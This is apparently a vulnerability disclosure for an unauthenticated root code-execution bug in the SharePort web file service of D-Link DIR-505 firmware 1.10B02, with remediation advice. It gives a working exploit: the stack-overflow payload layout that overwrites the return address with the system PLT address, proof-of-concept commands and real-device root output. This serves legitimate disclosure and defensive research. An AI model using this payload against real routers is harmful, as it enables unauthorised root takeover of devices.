# DIR-505 SharePort `webfile_cgi.cgi` Pre-Auth Root RCE

D-Link DIR-505 A1 firmware **1.10B02** exposes SharePort Web File Access on **TCP/8181**
(`/usr/bin/webfile_cgi.cgi`, running as root). Its `get_input_entries()` form parser
writes POST body bytes into `main()`'s stack frame with a fixed `0x425` stride and no
bounds check. An unauthenticated POST to `/dws/api/ListRoot` overwrites `main()`'s `$ra`
with the fixed `.system` PLT `0x40d180`, giving **unauthenticated root command execution**.

## Affected

| Item | Value |
|---|---|
| Device | D-Link DIR-505 A1 |
| Firmware | 1.10B02 (`DIR-505_A1_FW110B02.bin`, MD5 `cd13a30e3f971c23eace3ae94380f28b`) |
| Component | `/usr/bin/webfile_cgi.cgi` |
| Component MD5 | `28cb86cc8b93ba2e4a47c6261403b5ce` |
| Service | lighttpd-ws, TCP/8181, root |
| Architecture | MIPS32 big-endian, non-PIE |

## Reproduction

```bash
python3 poc/poc_shareport_unauth_rce.py --target 192.168.0.1 --id
python3 poc/poc_shareport_unauth_rce.py --target 192.168.0.1 --cmd 'uname -a'
```

Real-device result:

```text
[*] POST :8181/dws/api/ListRoot -> 500
[*] fetched /sp_0ll6zbqrfi.txt via TCP/8181
Uid:	0	0	0	0
Gid:	0	0	0	0
CapEff:	fffffffffffffeff
```

- `--id` reads `/proc/self/status`; this firmware has no `id` applet.
- `--cmd` must not contain `&` or `=`.
- Output is written to `/www/webfile_access/sp_<random>.txt` and fetched from TCP/8181.
- Port 80 is not used.

## Root cause

```c
buf[offset + field * 0x425]        = ch;  /* name  */
buf[offset + field * 0x425 + 0x24] = ch;  /* value */
```

`field` and `offset` are derived from `CONTENT_LENGTH` and are not checked against the
destination size.

## Exploit

```text
value = 0x00 + "A"*1026 + 5 * p32(0) + p32(0x40d180)
body  = "x=0<cmd>" + "&"*49 + "a=" + value
```

- 49 `&` fields place the next field at index 49.
- `$ra = 0x40d180` (`.system` PLT).
- `$a0` points to `field0_value + 1`, i.e. the command after the leading `0`.
- ASLR-independent: non-PIE fixed code address, stack-relative command pointer.

## Evidence

- `evidence/real/01_id.txt` — `Uid: 0`, `CapEff: fffffffffffffeff`
- `evidence/real/02_id_not_found.txt` — BusyBox has no `id` applet; command still runs
- `evidence/real/03_ls.txt` — directory listing
- `evidence/real/04_uname.txt` — kernel/version
- `evidence/real/00_reproduction.txt` — commands and transport
- `evidence/fingerprints.txt` — firmware/component hashes

## Duplicate / prior art

- NVD `keywordSearch=webfile_cgi`: 0 results (2026-11-12).
- NVD `keywordSearch=DIR-505`: 4 results, none this component.
- Public 2019 analysis covers the same `get_input_entries` root cause in `my_cgi.cgi`
  on TCP/80 (`storage_path`, offset 477472, ROP `0x405B1C`, firmware 1.08B10). This is a
  different binary, port, route, offset, and firmware.
- Not CVE-2014-3936 (HNAP Content-Length overflow) and not CVE-2016-5681 (SharePort
  cookie overflow).

## Remediation

Restrict TCP/8181 to the LAN, disable SharePort Web File Access, add bounds checks in
`get_input_entries`, enforce a maximum `CONTENT_LENGTH`, and authenticate `/dws/api/*`.
DIR-505 is EOL; replace the device.

## Disclosure

Real-device verification was performed on an owned device. This repository contains no
device credentials.
